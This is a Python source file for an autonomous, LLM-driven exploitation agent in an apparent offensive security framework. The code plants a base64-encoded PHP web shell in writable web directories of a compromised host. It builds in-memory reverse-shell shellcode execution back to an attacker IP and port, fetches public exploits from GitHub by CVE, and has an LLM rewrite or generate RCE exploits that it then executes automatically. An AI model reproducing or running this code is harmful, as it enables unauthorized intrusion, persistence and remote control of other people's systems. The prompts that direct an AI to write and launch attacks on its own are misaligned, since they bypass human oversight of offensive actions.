import asyncio
from core.data_models import AgentData, Strategy
import base64
import json
import os
import re
import httpx
from rich.syntax import Syntax
import time

from core.base_agent import BaseAgent
from core.data_models import Strategy, ExploitReport, AttackPhase, ErrorType
from core.logger import log
from core.context_manager import ContextManager # Import ContextManager
import time # Import time for start_time/end_time

class ExploitAgent(BaseAgent):
    supported_phases = [AttackPhase.INITIAL_FOOTHOLD, AttackPhase.LATERAL_MOVEMENT]
    required_tools = ["firejail", "msfconsole"]

    def __init__(self, context_manager: ContextManager = None, orchestrator=None, **kwargs): # Changed shared_data to context_manager
        super().__init__(context_manager, orchestrator, **kwargs) # Pass context_manager to super
        self.cache_manager = None
        self.http_client = httpx.AsyncClient() # Initialize directly for now
        self.metasploit_client = None
        self.payload_factory = None
        self.vulnerability_analyzer = None
        self.exploit_generator = None
        self.payload_optimizer = None
        self.BASE64_SHELL = "PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbJ2MnXSk7ID8+" # "<?php echo system($_GET['c']); ?>"
        self.pubsub_manager = orchestrator.pubsub_manager if orchestrator else None # Add this line
        self.vulnerability_queue = asyncio.Queue() # Add this line

    async def setup(self): # Add async setup method
        # Fetch managers from context_manager
        self.cache_manager = await self.context_manager.get_context('cache_manager')
        # http_client is initialized directly
        self.metasploit_client = await self.context_manager.get_context('metasploit_client')
        self.payload_factory = await self.context_manager.get_context('payload_factory')
        self.vulnerability_analyzer = await self.context_manager.get_context('vulnerability_analyzer')
        self.exploit_generator = await self.context_manager.get_context('exploit_generator')
        self.payload_optimizer = await self.context_manager.get_context('payload_optimizer')
        
        # Subscribe to vulnerability_found events
        if self.pubsub_manager:
            await self.pubsub_manager.subscribe("vulnerability_found", self._handle_vulnerability_found)

    async def _handle_vulnerability_found(self, message: dict):
        """Callback for vulnerability_found events."""
        self.orchestrator.log.info(f"ExploitAgent received vulnerability_found event: {message}")
        await self.vulnerability_queue.put(message)

    async def run(self, strategy: Strategy, **kwargs) -> ExploitReport:
        start_time = time.time()
        log.info("Running Exploit Agent...")
        exploit_code = ""
        source_of_code = ""

        # Check for vulnerabilities in the queue first
        if not self.vulnerability_queue.empty():
            vulnerability_message = await self.vulnerability_queue.get()
            log.info(f"Exploiting vulnerability from queue: {vulnerability_message}")
            # Here you would process the vulnerability_message and try to exploit it
            # For now, we'll just log it and continue with the original strategy
            # In a real scenario, this would override or augment the current strategy
            # For this example, we'll just use the first finding from the message
            if vulnerability_message.get("findings"):
                finding_context = vulnerability_message["findings"][0]
                strategy.context["finding_to_exploit"] = finding_context
                strategy.context["recommended_exploit_url"] = finding_context.get("context", {}).get("url")

        finding_context = strategy.context.get("finding_to_exploit", {})
        if not isinstance(finding_context, dict):
            finding_context = {"finding": str(finding_context)}

        exploit_url = finding_context.get("context", {}).get("url") or strategy.context.get("recommended_exploit_url")
        cve = finding_context.get("cve")

        # Primary logic: Search, download, parameterize, or generate exploit
        if not exploit_url and cve:
            exploit_urls = await self._search_for_exploit(cve)
            if exploit_urls:
                exploit_url = exploit_urls[0]

        if exploit_url and "github.com" in exploit_url:
            downloaded_code = await self._download_exploit(exploit_url)
            if downloaded_code:
                log.success("Successfully downloaded exploit code. Now attempting to parameterize it.")
                source_of_code = f"Downloaded from {exploit_url}"
                parameterize_prompt = await self._build_parameterize_prompt(downloaded_code, strategy)
                response_data = await self.orchestrator.call_llm_func(parameterize_prompt, context="ExploitParameterization")
                code_from_llm = response_data.get("parameterized_code", "")
                exploit_code = self._extract_code_from_llm(code_from_llm)

        if not exploit_code:
            log.info("No pre-made exploit found or parameterized. Attempting to generate exploit with LLM.")
            source_of_code = "Generated by LLM"
            generation_prompt = await self._build_exploit_prompt(strategy, finding_context)
            response_data = await self.orchestrator.call_llm_func(generation_prompt)
            exploit_code = response_data.get("exploit_code", "")

        if not exploit_code:
            error_message = "No exploit code could be found or generated."
            log.error(error_message)
            await self._report_failure(strategy, error_message)
            # Publish exploit_failure event
            await self.pubsub_manager.publish(
                "exploit_events",
                {
                    "event_type": "EXPLOIT_FAILURE",
                    "agent": self.__class__.__name__,
                    "strategy": strategy.to_dict(),
                    "error": error_message,
                    "error_type": ErrorType.LOGIC.value, # No exploit code is a logic failure
                    "timestamp": time.time()
                }
            )
            end_time = time.time()
            return ExploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=[error_message],
                error_type=ErrorType.LOGIC,
                summary="Exploit failed: No exploit code found or generated."
            )

        # Handle special directives from LLM
        if isinstance(exploit_code, dict):
            return await self._handle_exploit_directive(exploit_code, strategy)

        # Execute the final code
        try:
            log.success(f"Successfully obtained exploit code. Source: {source_of_code}")
            log.info("--- Generated/Modified Exploit Code ---")
            syntax = Syntax(exploit_code, "python" if "import " in exploit_code else "bash", theme="dracula", line_numbers=True)
            self.orchestrator.console.print(syntax)
            return await self._execute_exploit(exploit_code, strategy, start_time)
        except Exception as e:
            error_message = f"An error occurred during exploit execution: {e}"
            log.error(error_message, exc_info=True)
            await self._report_failure(strategy, error_message)
            # Publish exploit_failure event
            await self.pubsub_manager.publish(
                "exploit_events",
                {
                    "event_type": "EXPLOIT_FAILURE",
                    "agent": self.__class__.__name__,
                    "strategy": strategy.to_dict(),
                    "error": error_message,
                    "error_type": ErrorType.LOGIC.value, # General exception is a logic error
                    "timestamp": time.time()
                }
            )
            return ExploitReport(success=False, error_message=error_message, exploit_code=exploit_code)

    async def _handle_exploit_directive(self, directive: dict, strategy: Strategy) -> ExploitReport:
        exploit_directive = directive.get("exploit_code")
        log.info(f"ExploitAgent: Strategy suggests using directive: {exploit_directive}")
        start_time = time.time() # Capture start_time for this sub-operation

        if not exploit_directive:
            end_time = time.time()
            return ExploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=["LLM failed to generate a valid exploit directive."],
                error_type=ErrorType.LOGIC,
                summary="Exploit failed: LLM did not provide an exploit directive."
            )

        if exploit_directive == "IN_MEMORY_SHELLCODE":
            return await self._handle_in_memory_shellcode(directive, start_time)
        elif exploit_directive == "COMMAND_INJECTION_BINARY":
            log.warning("The 'COMMAND_INJECTION_BINARY' directive is not yet fully implemented.")
            end_time = time.time()
            return ExploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=["Directive not implemented."],
                error_type=ErrorType.LOGIC,
                summary="Exploit directive COMMAND_INJECTION_BINARY not implemented."
            )
        elif exploit_directive == "FORMAT_STRING_BINARY":
            binary_path = directive.get("binary_path")
            if not binary_path:
                end_time = time.time()
                return ExploitReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    errors=["Missing binary_path for FORMAT_STRING_BINARY."],
                    error_type=ErrorType.CONFIGURATION,
                    summary="Exploit directive FORMAT_STRING_BINARY failed: Missing binary path."
                )
            exploit_result = self.orchestrator.agents["FormatStringExploiter"].exploit(binary_path)
            end_time = time.time()
            return ExploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                exploit_code=json.dumps(directive),
                output=exploit_result.get("output"),
                summary="Format string exploit attempted.",
                errors=[] if exploit_result.get("success") else ["Format string exploit failed."]
            )
        elif exploit_directive == "WEB_SHELL_PLANTING":
            return await self._plant_web_shell(strategy, start_time)
        else:
            end_time = time.time()
            return ExploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=[f"Unknown exploit directive: {exploit_directive}"],
                error_type=ErrorType.LOGIC,
                summary=f"Unknown exploit directive: {exploit_directive}"
            )

    async def _handle_in_memory_shellcode(self, directive: dict, start_time: float) -> ExploitReport:
        payload_type = directive.get("payload_type")
        lhost = directive.get("lhost", await self.context_manager.get_context('attacker_ip'))
        lport = directive.get("lport", await self.context_manager.get_context('attacker_port'))

        if not all([payload_type, lhost, lport]):
            end_time = time.time()
            return ExploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=["Missing payload_type, lhost, or lport for IN_MEMORY_SHELLCODE."],
                error_type=ErrorType.CONFIGURATION,
                summary="IN_MEMORY_SHELLCODE failed: Missing required parameters."
            )

        if payload_type == "linux/x64/shell_reverse_tcp":
            shellcode = self.payload_factory.create_linux_x64_reverse_shell(lhost, lport)
        else:
            end_time = time.time()
            return ExploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=[f"Unsupported payload_type: {payload_type}"],
                error_type=ErrorType.LOGIC,
                summary=f"IN_MEMORY_SHELLCODE failed: Unsupported payload type {payload_type}."
            )

        if not shellcode:
            end_time = time.time()
            return ExploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=["Payload factory failed to generate shellcode."],
                error_type=ErrorType.LOGIC,
                summary="IN_MEMORY_SHELLCODE failed: Shellcode generation failed."
            )

        log.success("Successfully generated shellcode. Preparing for in-memory execution.")
        b64_shellcode = base64.b64encode(shellcode).decode()
        execution_script = f"python -c 'import ctypes,base64;buf=base64.b64decode(\"{b64_shellcode}\");ctypes.memmove(ctypes.c_void_p(ctypes.addressof(ctypes.create_string_buffer(buf))),buf,len(buf));ctypes.string_at(ctypes.addressof(ctypes.create_string_buffer(buf)),len(buf))()" 
        
        # This becomes the new exploit_code to be executed
        strategy = self.context.get("strategy", Strategy.BALANCED)
        return await self._execute_exploit(execution_script, strategy, start_time)

    async def generate_ai_exploit(self, vulnerability_data: dict, target_info: dict) -> dict:
        """Generate AI-powered exploit for vulnerability"""
        try:
            response_text = vulnerability_data.get("response_text", "")
            url = vulnerability_data.get("url", "")
            parameters = vulnerability_data.get("parameters", {})

            vulnerabilities = await self.vulnerability_analyzer.analyze_response(response_text, url, parameters)
            if not vulnerabilities:
                return {"success": False, "error": "No vulnerabilities detected"}

            exploits = [await self.exploit_generator.generate_exploit(v, target_info) for v in vulnerabilities]
            
            optimized_exploits = []
            for exploit in exploits:
                optimization_result = await self.payload_optimizer.optimize_payload(
                    exploit.payload, exploit.vulnerability.type, "EVASION", target_info
                )
                test_result = await self.exploit_generator.test_exploit(
                    exploit, target_info.get("target_url", url)
                )
                optimized_exploits.append({
                    "exploit": exploit,
                    "optimized_payload": optimization_result.payload,
                    "test_result": test_result,
                    "optimization_score": optimization_result.optimization_score
                })
            
            best_exploit = self._select_best_exploit(optimized_exploits)
            return {
                "success": True,
                "best_exploit": best_exploit,
                "all_exploits": optimized_exploits,
                "vulnerabilities": vulnerabilities
            }
        except Exception as e:
            log.error(f"Failed to generate AI exploit: {e}")
            return {"success": False, "error": str(e)}

    async def execute(self, strategy: Strategy) -> AgentData:
        """Execute exploit agent"""
        try:
            target = strategy.context.get('target_url', '')
            
            # Call existing method
            if asyncio.iscoroutinefunction(self.run):
                results = await self.run(target)
            else:
                results = self.run(target)
            
            return AgentData(
                agent_name=self.__class__.__name__,
                success=True,
                summary=f"{self.__class__.__name__} completed successfully",
                errors=[],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={'results': results}
            )
        except Exception as e:
            return AgentData(
                agent_name=self.__class__.__name__,
                success=False,
                summary=f"{self.__class__.__name__} failed",
                errors=[str(e)],
                execution_time=0,
                memory_usage=0,
                cpu_usage=0,
                context={}
            )

    def _select_best_exploit(self, optimized_exploits: list) -> dict:
        return max(optimized_exploits, key=lambda x: (x["test_result"]["success"], x["optimization_score"]),
                   default=None)

    async def _report_failure(self, strategy: Strategy, error_message: str):
        if not self.orchestrator or not hasattr(self.orchestrator, 'heuristics_manager'):
            return
        finding_context = strategy.context.get("finding_to_exploit", {})
        key = finding_context.get("cve") or finding_context.get("finding") or strategy.directive
        context_snapshot = await self.orchestrator._get_context_snapshot()
        self.orchestrator.heuristics_manager.add_failed_heuristic(
            heuristic_type='exploit',
            key=key,
            strategy=strategy.model_dump(),
            report={"errors": [error_message]},
            context_snapshot=context_snapshot
        )
        log.warning(f"Reported failed exploit heuristic for key: {key}")

    def _get_raw_github_url(self, github_url: str) -> str | None:
        match = re.match(r"https://github\.com/([^/]+)/([^/]+)/blob/([^/]+)/(.+)", github_url)
        if match:
            user, repo, branch, file_path = match.groups()
            return f"https://raw.githubusercontent.com/{user}/{repo}/{branch}/{file_path}"
        return None

    async def _search_for_exploit(self, cve: str) -> list:
        if not self.cache_manager: return []
        cache_key = f"exploit_search:{cve}"
        if (cached := self.cache_manager.get(cache_key)):
            return cached
        try:
            url = f"https://api.exploit.observer/v1/cve/{cve}"
            response = await self.http_client.get(url)
            response.raise_for_status()
            data = response.json()
            urls = [exp["url"] for exp in data.get("exploits", []) if exp.get("url")]
            self.cache_manager.set(cache_key, urls, ttl=86400 * 7)
            return urls
        except httpx.RequestError as e:
            log.error(f"Failed to search for exploits: {e}")
            return []

    async def _download_exploit(self, url: str) -> str | None:
        if not self.cache_manager: return None
        cache_key = f"exploit_code_download:{url}"
        if (cached := self.cache_manager.get(cache_key)):
            return cached
        if not (raw_url := self._get_raw_github_url(url)):
            return None
        try:
            response = await self.http_client.get(raw_url)
            response.raise_for_status()
            code = response.text
            self.cache_manager.set(cache_key, code, ttl=86400 * 30)
            return code
        except httpx.RequestError as e:
            log.error(f"Failed to download exploit code: {e}")
            return None

    async def _test_web_shell(self, shell_url: str, vuln_param: str = "c") -> bool:
        test_command = "whoami"
        b64_command = base64.b64encode(test_command.encode()).decode()
        full_test_url = f"{shell_url}?{vuln_param}={b64_command}"
        try:
            response = await self.http_client.get(full_test_url)
            if response.status_code == 200 and response.text.strip() and "<html" not in response.text:
                decoded_output = base64.b64decode(response.text.strip()).decode('utf-8', errors='ignore')
                log.success(f"SHELL CONFIRMED! Output of 'whoami': {decoded_output}")
                return True
        except httpx.RequestError as e:
            log.warning(f"Web shell test failed for {shell_url}: {e}")
        return False

    async def _find_web_root(self, shell_id) -> str:
        web_roots = ["/var/www/html", "/var/www/", "/usr/share/nginx/html"]
        for root in web_roots:
            check_cmd = f"if [ -d {root} ]; then echo '{root}'; fi"
            output = await self.orchestrator.shell_manager.send_command(shell_id, check_cmd)
            if output and root in output:
                log.success(f"Discovered web root at: {root}")
                return root
        return "/var/www/html" # Fallback

    async def _plant_web_shell(self, strategy: Strategy, start_time: float) -> ExploitReport:
        shell_id = strategy.context.get("shell_id")
        if not shell_id:
            end_time = time.time()
            return ExploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=["Web shell planting requires a shell_id."],
                error_type=ErrorType.CONFIGURATION,
                summary="Web shell planting failed: Missing shell_id."
            )

        web_root = await self._find_web_root(shell_id)
        find_cmd = f"find {web_root} -type d -writable 2>/dev/null"
        writable_dirs_output = await self.orchestrator.shell_manager.send_command(shell_id, find_cmd)
        
        if not writable_dirs_output:
            end_time = time.time()
            return ExploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=["No writable directories found."],
                error_type=ErrorType.LOGIC,
                summary="Web shell planting failed: No writable directories found."
            )

        writable_dirs = writable_dirs_output.strip().split('\n')
        TEST_FILENAME = f"shell_{strategy.id[:8]}.php"

        for directory in writable_dirs:
            if not (d := directory.strip()): continue
            remote_path = f"{d}/{TEST_FILENAME}"
            relative_dir = os.path.relpath(d, web_root) if os.path.relpath(d, web_root) != '.' else ''
            target_url = await self.context_manager.get_context('target_url')
            shell_url = f"{target_url.rstrip('/')}/{os.path.join(relative_dir, TEST_FILENAME)}"
            
            plant_cmd = f"echo '{self.BASE64_SHELL}' | base64 -d > {remote_path}"
            await self.orchestrator.shell_manager.send_command(shell_id, plant_cmd)

            if await self._test_web_shell(shell_url):
                log.success(f"Web shell successfully planted at: {shell_url}")
                end_time = time.time()
                return ExploitReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    output=f"Web shell planted at {shell_url}",
                    summary=f"Web shell successfully planted at {shell_url}"
                )
            else:
                await self.orchestrator.shell_manager.send_command(shell_id, f"rm {remote_path}")
        
        end_time = time.time()
        return ExploitReport(
            agent_name=self.__class__.__name__,
            start_time=start_time,
            end_time=end_time,
            errors=["All web shell planting techniques failed."],
            error_type=ErrorType.LOGIC,
            summary="Web shell planting failed: All techniques failed."
        )

    async def _execute_exploit(self, exploit_code: str, strategy: Strategy, start_time: float) -> ExploitReport:
        log.info("Attempting to execute exploit code...")
        shell_id_to_pivot = strategy.context.get("shell_id")
        
        runner, runner_kwargs = (self.orchestrator.shell_manager.send_command, {"shell_id": shell_id_to_pivot}) if shell_id_to_pivot else (self.orchestrator.run_shell_command, {})

        shells_before = await self.orchestrator.shell_manager.list_shells()
        
        try:
            # Simplified execution logic
            result = await runner(command=exploit_code, **runner_kwargs)
            
            log.info(f"Exploit execution finished. STDOUT: {result.get('stdout') if isinstance(result, dict) else result}")
            if isinstance(result, dict) and result.get('stderr'):
                log.error(f"STDERR: {result.get('stderr')}")

            await asyncio.sleep(5)
            shells_after = await self.orchestrator.shell_manager.list_shells()
            new_shell_ids = list(set(shells_after) - set(shells_before))

            if new_shell_ids:
                new_shell_id = new_shell_ids[0]
                confirmation_output = await self.orchestrator.shell_manager.send_command(new_shell_id, "whoami")
                if confirmation_output and "Error:" not in confirmation_output:
                    log.success(f"SUCCESS! New shell confirmed. User: {confirmation_output.strip()}")
                    
                    # Publish exploit_success event
                    await self.pubsub_manager.publish(
                        "exploit_events",
                        {
                            "event_type": "EXPLOIT_SUCCESS",
                            "agent": self.__class__.__name__,
                            "strategy": strategy.to_dict(),
                            "shell_id": new_shell_id,
                            "output": str(result),
                            "timestamp": time.time()
                        }
                    )
                    end_time = time.time()
                    return ExploitReport(
                        agent_name=self.__class__.__name__,
                        start_time=start_time,
                        end_time=end_time,
                        shell_id=new_shell_id,
                        output=str(result),
                        summary=f"Exploit successful: New shell established with ID {new_shell_id}."
                    )
                else:
                    error_message = "New shell detected but failed to respond."
                    await self._report_failure(strategy, error_message)
                    
                    # Publish exploit_failure event
                    await self.pubsub_manager.publish(
                        "exploit_events",
                        {
                            "event_type": "EXPLOIT_FAILURE",
                            "agent": self.__class__.__name__,
                            "strategy": strategy.to_dict(),
                            "error": error_message,
                            "error_type": ErrorType.LOGIC.value, # Assuming logic error for non-responsive shell
                            "timestamp": time.time()
                        }
                    )
                    end_time = time.time()
                    return ExploitReport(
                        agent_name=self.__class__.__name__,
                        start_time=start_time,
                        end_time=end_time,
                        errors=[error_message],
                        error_type=ErrorType.LOGIC,
                        output=str(result),
                        summary="Exploit failed: New shell detected but non-responsive."
                    )
            else:
                error_message = "Exploit executed, but no new shell was established."
                await self._report_failure(strategy, error_message)
                
                # Publish exploit_failure event
                await self.pubsub_manager.publish(
                    "exploit_events",
                    {
                        "event_type": "EXPLOIT_FAILURE",
                        "agent": self.__class__.__name__,
                        "strategy": strategy.to_dict(),
                        "error": error_message,
                        "error_type": ErrorType.LOGIC.value, # Assuming logic error for no shell
                        "timestamp": time.time()
                    }
                )
                end_time = time.time()
                return ExploitReport(
                    agent_name=self.__class__.__name__,
                    start_time=start_time,
                    end_time=end_time,
                    errors=[error_message],
                    error_type=ErrorType.LOGIC,
                    output=str(result),
                    summary="Exploit failed: No new shell established."
                )

        except Exception as e:
            error_message = f"An error occurred during exploit execution logic: {e}"
            log.error(error_message, exc_info=True)
            await self._report_failure(strategy, error_message)
            
            # Publish exploit_failure event
            await self.pubsub_manager.publish(
                "exploit_events",
                {
                    "event_type": "EXPLOIT_FAILURE",
                    "agent": self.__class__.__name__,
                    "strategy": strategy.to_dict(),
                    "error": error_message,
                    "error_type": ErrorType.LOGIC.value, # General exception is a logic error
                    "timestamp": time.time()
                }
            )
            end_time = time.time()
            return ExploitReport(
                agent_name=self.__class__.__name__,
                start_time=start_time,
                end_time=end_time,
                errors=[error_message],
                error_type=ErrorType.LOGIC,
                summary=f"Exploit execution failed due to an unexpected error: {e}"
            )

    def _extract_code_from_llm(self, code_from_llm: str) -> str:
        if isinstance(code_from_llm, str) and code_from_llm.strip().startswith("```"):
            return "\n".join(code_from_llm.strip().split('\n')[1:-1])
        return code_from_llm

    async def _build_parameterize_prompt(self, code: str, strategy: Strategy) -> str: # Make async
        # Builds a prompt for the LLM to parameterize a downloaded script.
        target_url = await self.context_manager.get_context('target_url')
        target_host = await self.context_manager.get_context('target_host')
        attacker_ip = await self.context_manager.get_context('attacker_ip')
        attacker_port = await self.context_manager.get_context('attacker_port')
        return f'''As a penetration testing expert, modify the following Python script to replace placeholders with the correct values from the context.
        **Downloaded Code:**
```python
{code}
```
        **Context:**
        - Target URL: {target_url}
        - Target Host/RHOST: {target_host}
        - Attacker IP/LHOST: {attacker_ip}
        - Attacker Port/LPORT: {attacker_port}
        **Task:** Return ONLY a valid JSON object with a single key "parameterized_code" containing the complete, modified script.
        '''

    async def _build_exploit_prompt(self, strategy: Strategy, finding_context: dict) -> str: # Make async
        # Builds a prompt for the LLM to generate exploit code from scratch.
        attacker_ip = await self.context_manager.get_context('attacker_ip')
        attacker_port = await self.context_manager.get_context('attacker_port')
        return f'''As a world-class penetration tester AI, choose the best method to exploit a vulnerability for RCE or privilege escalation.
        **Context:** {json.dumps(finding_context, indent=2)}
        **Attacker Info:** IP={attacker_ip}, Port={attacker_port}
        **Task:** Provide ONLY a valid JSON object with a single key "exploit_code". The value can be a command string, a full script, or a special JSON directive for other agents.
        '''